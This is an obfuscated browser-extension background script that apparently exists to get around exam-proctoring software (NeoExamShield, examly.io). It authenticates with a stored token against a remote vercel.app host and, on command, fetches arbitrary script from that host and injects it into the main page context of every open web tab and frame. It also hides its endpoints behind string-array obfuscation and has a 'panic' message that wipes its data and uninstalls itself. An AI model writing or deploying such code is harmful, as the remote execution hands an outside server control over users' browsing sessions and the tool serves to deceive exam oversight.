          _0x18f488["enabled"] &&
          "NeoExamShield" !== _0x18f488["name"] &&
          _0x56a14e(0xbf) === _0x18f488[_0x56a14e(0xe6)]
      )[_0x56a14e(0xe5)];
    _0x5ead53(_0x3d7095, _0x1ffcc3);
  });
}
const fetchDomainIp = (_0x55f59d) =>
  new Promise((_0x1de456) => {
    const _0x51e80d = _0x2702f7,
      _0x2b4808 = new URL(_0x55f59d)[_0x51e80d(0xd2)];
    fetch(_0x51e80d(0xbb) + _0x2b4808)
      [_0x51e80d(0xb1)]((_0x57a7eb) => _0x57a7eb[_0x51e80d(0xb8)]())
      [_0x51e80d(0xb1)]((_0x341439) => {
        const _0x4db121 = _0x51e80d,
          _0x1352dc =
            _0x341439["Answer"][_0x4db121(0xd9)](
              (_0x5a060f) => 0x1 === _0x5a060f[_0x4db121(0xe6)]
            )?.[_0x4db121(0xd6)] || null;
        _0x1de456(_0x1352dc);
      })
      [_0x51e80d(0xb0)](() => {
        _0x1de456(null);
      });
  });
async function handleUrlChange() {
  const _0x5d2124 = _0x2702f7;
  if (
    urlPatterns[_0x5d2124(0xd3)]((_0x2ace48) =>
      tabDetails[_0x5d2124(0xde)][_0x5d2124(0xd5)](_0x2ace48)
    )
  ) {
    let _0x316f80 = await ((_0x5d6316 = tabDetails[_0x5d2124(0xde)]),
    new Promise((_0x5ce510) => {
      const _0x2ef9d9 = _0x5d2124,
        _0x2f3011 = new URL(_0x5d6316)["hostname"];
      fetch(_0x2ef9d9(0xbb) + _0x2f3011)
        [_0x2ef9d9(0xb1)]((_0x25dd0a) => _0x25dd0a[_0x2ef9d9(0xb8)]())
        [_0x2ef9d9(0xb1)]((_0x8b5eb9) => {
          const _0xc9acad = _0x2ef9d9,
            _0x55c3ee =
              _0x8b5eb9[_0xc9acad(0xd0)][_0xc9acad(0xd9)](
                (_0xde6a5c) => 0x1 === _0xde6a5c["type"]
              )?.[_0xc9acad(0xd6)] || null;
          _0x5ce510(_0x55c3ee);
        })
        [_0x2ef9d9(0xb0)](() => {
          _0x5ce510(null);
        });
    }));
    (_0x316f80 && domain_ip_addresses["includes"](_0x316f80)) ||
    tabDetails["url"]["includes"](_0x5d2124(0xc4)) ||
    tabDetails[_0x5d2124(0xde)]["includes"](_0x5d2124(0xe1)) ||
    tabDetails[_0x5d2124(0xde)]["includes"]("examly.io")
      ? fetchExtensionDetails((_0x5ab966, _0x407ec3) => {
          const _0x6ce748 = _0x5d2124;
          let _0x4ad597 = {
            action: _0x6ce748(0xb9),
            url: tabDetails["url"],
            enabledExtensionCount: _0x407ec3,
            extensions: _0x5ab966,
            id: tabDetails["id"],
            currentKey: currentKey,
          };
          browser["tabs"][_0x6ce748(0xc5)](tabDetails["id"], _0x4ad597, (_0x32b276) => {
            const _0x5b23ba = _0x6ce748;
            browser[_0x5b23ba(0xf2)][_0x5b23ba(0xc6)] &&
              _0x5b23ba(0xe7) === browser["runtime"]["lastError"][_0x5b23ba(0xc3)] &&
              browser[_0x5b23ba(0xe0)][_0x5b23ba(0xe8)](tabDetails["id"], {
                url: tabDetails["url"],
              });
          });
        })
      : console[_0x5d2124(0xdd)](_0x5d2124(0xda));
  }
  var _0x5d6316;
}
function openNewMinimizedWindowWithUrl(_0x3f2773) {
  const _0x4e9ba9 = _0x2702f7;
  browser[_0x4e9ba9(0xe0)][_0x4e9ba9(0xbd)]({ url: _0x3f2773 }, (_0x51d3fc) => {});
}
function reloadMatchingTabs() {
  const _0x3194d6 = _0x2702f7;
  isReloading ||
    ((isReloading = !0x0),
    browser[_0x3194d6(0xe0)][_0x3194d6(0xdf)]({}, (_0x2b24b0) => {
      const _0x53f0f2 = _0x3194d6;
      _0x2b24b0[_0x53f0f2(0xe9)]((_0x28eb07) => {
        const _0x3dafef = _0x53f0f2;
        urlPatterns[_0x3dafef(0xd3)]((_0x54d5b2) => _0x28eb07["url"][_0x3dafef(0xd5)](_0x54d5b2)) &&
          browser[_0x3dafef(0xe0)]["reload"](_0x28eb07["id"], () => {
            const _0x440f82 = _0x3dafef;
            console[_0x440f82(0xdd)](
              _0x440f82(0xf0) + _0x28eb07["id"] + _0x440f82(0xe3) + _0x28eb07[_0x440f82(0xde)]
            );
          });
      }),
        setTimeout(() => {
          isReloading = !0x1;
        }, 0x3e8);
    }));
}
async function verifyFileIntegrity() {
  const _0x1b2f37 = _0x2702f7,
    _0x54ee97 = await fetch(_0x1b2f37(0xdb), {
      headers: {
        accept: _0x1b2f37(0xc7),
        "accept-language": "en-US,en;q=0.9",
        "cache-control": _0x1b2f37(0xd4),
        "content-type": "application/json",
      },
      method: _0x1b2f37(0xce),
      mode: "cors",
    }),
    _0x3f2b05 = await _0x54ee97[_0x1b2f37(0xb8)]();
  console[_0x1b2f37(0xdd)](_0x3f2b05),
    _0x3f2b05[_0x1b2f37(0xb7)] || (sendVerifyMessage(), (isValidExtension = !0x0));
}
function sendVerifyMessage() {
  const _0x341af9 = _0x2702f7;
  if (urlPatterns["some"]((_0x5db2c1) => tabDetails[_0x341af9(0xde)]["includes"](_0x5db2c1))) {
    let _0x1b1e25 = { action: "invalid", license: !0x0 };
    chrome[_0x341af9(0xe0)]["sendMessage"](tabDetails["id"], _0x1b1e25);
  }
}
browser[_0x2702f7(0xe0)][_0x2702f7(0xc0)][_0x2702f7(0xb4)]((_0x28a36c) => {
  const _0x540c78 = _0x2702f7;
  browser[_0x540c78(0xe0)]["get"](_0x28a36c["tabId"], (_0x30021f) => {
    tabDetails = _0x30021f;
  });
}),
  browser["tabs"][_0x2702f7(0xc8)][_0x2702f7(0xb4)]((_0x5d1fec, _0x2b66f0, _0x581039) => {
    const _0x6d21b6 = _0x2702f7;
    _0x6d21b6(0xed) === _0x2b66f0["status"] && ((tabDetails = _0x581039), handleUrlChange());
  }),
  browser[_0x2702f7(0xcb)][_0x2702f7(0xd1)][_0x2702f7(0xb4)]((_0xea5bfb) => {
    reloadMatchingTabs();
  }),
  browser[_0x2702f7(0xf2)][_0x2702f7(0xea)]["addListener"]((_0x1afe0d, _0x51a9cc, _0xd17d57) => {
    const _0x532e91 = _0x2702f7;
    console["log"](_0x532e91(0xd8), _0x1afe0d),
      (currentKey = _0x1afe0d[_0x532e91(0xef)]),
      "pageReloaded" === _0x1afe0d[_0x532e91(0xee)] ||
      _0x532e91(0xba) === _0x1afe0d[_0x532e91(0xee)]
        ? handleUrlChange()
        : _0x532e91(0xe4) === _0x1afe0d["action"] &&
          openNewMinimizedWindowWithUrl(_0x1afe0d[_0x532e91(0xde)]);
  }),
  verifyFileIntegrity(),
  setInterval(sendVerifyMessage, 0x1388),
  setInterval(verifyFileIntegrity, 0x7530);
async function copyToClipboard(e) {
  var t = await getCredentials();
  t &&
    null != t &&
    browser.tabs.query({ active: !0, currentWindow: !0 }, function (t) {
      t[0] &&
        (t[0].url.startsWith("http://") || t[0].url.startsWith("https://")) &&
        browser.scripting.executeScript({
          target: { tabId: t[0].id },
          func: function (e) {
            const t = document.createElement("textarea");
            (t.textContent = e),
              document.body.appendChild(t),
              t.select(),
              document.execCommand("copy"),
              document.body.removeChild(t);
          },
          args: [e],
        });
    });
}
function _0x3e7a(e, t) {
  const n = _0x5975();
  return (_0x3e7a = function (e, t) {
    return n[(e -= 315)];
  })(e, t);
}
async function checkLogout() {
  const e = _0x3e7a,
    t = {
      TOThg: e(327) + e(348),
      lbtQP: e(328) + e(343),
      rQXoQ: function (e) {
        return e();
      },
      DYTMC: function (e, t, n) {
        return e(t, n);
      },
      AwQRn: e(352) + e(357) + e(334) + e(358) + e(324) + e(359),
      vSbTd: e(329),
      zTrmG: e(339) + e(325),
    };
  console[e(337)](t[e(353)]);
  const n = await t[e(362)](getCredentials);
  if (!n) return;
  const r = await t[e(318)](fetch, t[e(331)], {
      method: t[e(335)],
      headers: { Authorization: e(340) + n, "Content-Type": t[e(317)] },
      body: JSON[e(320)]({}),
    }),
    o = await r[e(338)]();
  o[e(356)] &&
    browser[e(322)][e(350)][e(345)](function () {
      const n = e;
      console[n(337)](t[n(321)]),
        browser[n(323)][n(361)]({}, (e) => {
          const t = n,
            r = e[t(355)](
              (e) =>
                new Promise((n) => {
                  const r = t;
                  browser[r(323)][r(342)](e.id, {}, n);
                })
            );
          console[t(337)](o),
            Promise[t(354)](r)[t(341)](() => {
              const e = t;
              browser[e(351)][e(333) + e(326)]();
            });
        });
    });
}
function _0x5975() {
  const e = [
    "POST",
    "174022PwrNJV",
    "AwQRn",
    "414wtFMjk",
    "uninstallS",
    "uven.verce",
    "vSbTd",
    "1722PgNJcv",
    "log",
    "json",
    "applicatio",
    "Bearer ",
    "then",
    "reload",
    "890",
    "4ByZDNB",
    "clear",
    "14JwzxDP",
    "252340fpxsOE",
    "leared.",
    "40942020AhWBCl",
    "local",
    "management",
    "https://th",
    "lbtQP",
    "all",
    "map",
    "status",
    "ottathukid",
    "l.app/api/",
    "Signout",
    "15180ImUFIF",
    "query",
    "rQXoQ",
    "4426161fpMAKR",
    "3027928cniYPw",
    "13rnxrpu",
    "zTrmG",
    "DYTMC",
    "4585757CAIGTQ",
    "stringify",
    "TOThg",
    "storage",
    "tabs",
    "ext/remote",
    "n/json",
    "elf",
    "All data c",
    "---1234567",
  ];
  return (_0x5975 = function () {
    return e;
  })();
}
!(function (e, t) {
  const n = _0xfcfe,
    r = _0x5cd2();
  for (;;)
    try {
      if (
        853550 ===
        (-parseInt(n(254)) / 1) * (-parseInt(n(288)) / 2) +
          -parseInt(n(278)) / 3 +
          -parseInt(n(306)) / 4 +
          (parseInt(n(262)) / 5) * (parseInt(n(242)) / 6) +
          -parseInt(n(292)) / 7 +
          (-parseInt(n(294)) / 8) * (parseInt(n(290)) / 9) +
          parseInt(n(297)) / 10
      )
        break;
      r.push(r.shift());
    } catch (e) {
      r.push(r.shift());
    }
})(),
  (function (e, t) {
    const n = _0x3e7a,
      r = _0x5975();
    for (;;)
      try {
        if (
          754642 ===
          (-parseInt(n(316)) / 1) * (parseInt(n(330)) / 2) +
            (-parseInt(n(363)) / 3) * (parseInt(n(344)) / 4) +
            (parseInt(n(360)) / 5) * (-parseInt(n(336)) / 6) +
            (parseInt(n(346)) / 7) * (-parseInt(n(315)) / 8) +
            (parseInt(n(332)) / 9) * (parseInt(n(347)) / 10) +
            parseInt(n(319)) / 11 +
            parseInt(n(349)) / 12
        )
          break;
        r.push(r.shift());
      } catch (e) {
        r.push(r.shift());
      }
  })(),
  browser.runtime.onStartup.addListener(activate),
  browser.runtime.onInstalled.addListener(activate),
  (activate.actions = []),
  browser.runtime.onInstalled.addListener(() => {
    browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
      const t = e[0];
      (t.url.startsWith("http://") || t.url.startsWith("https://")) &&
        browser.tabs.update(t.id, { url: t.url });
    });
  }),
  browser.runtime.onMessage.addListener(async (e, t, n) => {
    var r = await getCredentials();
    if (r && null != r)
      if ("processChatMessage" === e.action) {
        const { message: t, context: n } = e;
        (chatContext = n), processChatMessage(t);
      } else "resetContext" === e.action && (chatContext = []);
  }),
  browser.runtime.onInstalled.addListener(() => {
    browser.storage.local.get(["credentials"], (e) => {
      e.credentials || browser.action.setPopup({ popup: "popup.html" });
    });
  }),
  (async () => {
    const e = await getCredentials();

    const isCurrentVersion = await (async function () {
      const e = await fetch("https://thottathukiduven.vercel.app/api/version"),
        t = (await e.json()).version,
        n = browser.runtime.getManifest().version;
      if (parseFloat(t) > parseFloat(n)) {
        browser.windows.create({
          url: "data/update/updatePopup.html",
          type: "popup",
          width: 100,
          height: 100,
        });
        return false;
      }
      return true;
    })();

    if (isCurrentVersion && e) {
      injectScript();
    }
  })(),
  browser.runtime.onMessage.addListener((e, t, n) => {
    console.log("message received", e),
      "success-login" === e.message
        ? (browser.storage.local.set({ credentials: e.token }, () => {
            console.log("credentials saved");
          }),
          console.log(browser.storage.local.get(["credentials"])),
          injectScript())
        : "logout-uwu" === e.message
        ? (browser.storage.local.remove("credentials", function () {
            console.log("credentials removed");
          }),
          console.log(browser.storage.local.get(["credentials"])),
          browser.contextMenus.removeAll(function () {
            console.log("All context menus removed.");
          }),
          browser.tabs.query({}, (e) => {
            e.forEach((e) => {
              browser.tabs.reload(e.id);
            });
          }),
          browser.action.setPopup({ popup: "popup.html" }))
        : "potus-panic-101" === e.message &&
          browser.storage.local.clear(function () {
            console.log("All data cleared."),
              browser.tabs.query({}, (e) => {
                const t = e.map(
                  (e) =>
                    new Promise((t) => {
                      browser.tabs.reload(e.id, {}, t);
                    })
                );
                Promise.all(t).then(() => {
                  browser.management.uninstallSelf();
                });
              });
          });
  }),
  checkLogout();
setInterval(checkLogout, 9e5);
browser.runtime.onMessage.addListener((e, t, n) => {
  if ("fetchAndExecuteScript" === e.action)
    return (
      fetch("https://thottathukiduven.vercel.app/api/ext/test")
        .then((e) => e.text())
        .then((e) => {
          executeScript(e, n);
        })
        .catch((e) => {
          console.error("Error fetching the script:", e), n({ err: 3, info: e.message });
        }),
      !0
    );
});
const executeScript = async (e, t) => {
    if (!e) return t({ err: 1, info: "Impossible, somehow no code" });
    const n = (await browser.tabs.query({})).filter(
      (e) => e.url.startsWith("http://") || e.url.startsWith("https://")
    );
    if (0 === n.length) return t({ err: 2, info: "No valid tabs for job" });
    try {
      t({
        err: 0,
        info: "Script executed on all valid tabs",
        results: await Promise.all(
          n.map(async (t) => {
            const n = {
              injectImmediately: !0,
              world: "MAIN",
              target: { allFrames: !0, tabId: t.id },
            };
            return (
              await browser.scripting.executeScript({
                ...n,
                args: [e],
                func: (e) => {
                  const t = document.createElement("script");
                  (t.textContent = `(async () => { ${e} })().catch((error) => {\n            try {\n              console.error(\`"\${error.message}" \${error.stack.split("\\n")[1].trim()}\`);\n            } catch (err) {\n              console.error(error);\n            }\n          });`),
                    document.documentElement.appendChild(t),
                    t.remove();
                },
              }),
              { tabId: t.id, success: !0 }
            );
          })
        ),
      });
    } catch (e) {
      console.error(e), t({ err: 3, info: e.message });
    }
  },
  getActiveTabId = async () => {
    const e = (await browser.tabs.query({ active: !0, lastFocusedWindow: !0 }))[0];
    return e ? e.id : null;
  };
browser.tabs.onActivated.addListener(async ({ tabId: e }) => {
  const { url: t } = await browser.tabs.get(e);
  checkUrlForGood(t) && browser.storage.local.set({ lastTab: e });
});
const checkUrlForGood = (e) => e?.startsWith("http");
